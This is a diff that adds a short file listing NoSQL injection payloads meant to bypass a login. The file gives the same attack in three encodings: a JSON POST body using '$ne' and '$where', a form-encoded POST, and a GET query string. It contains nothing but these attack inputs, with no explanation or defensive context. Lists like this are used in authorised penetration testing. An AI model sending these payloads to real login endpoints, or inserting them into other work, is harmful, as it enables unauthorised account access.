@@ -1,0 +1,6 @@
+1. JSON POST
+{"username":{"$ne":""},"password":{"$ne":""},"$where":"true"}
+2. POST
+username[$ne]=&$where=true
+3. GET
+?username[$ne]=&password[$ne]=
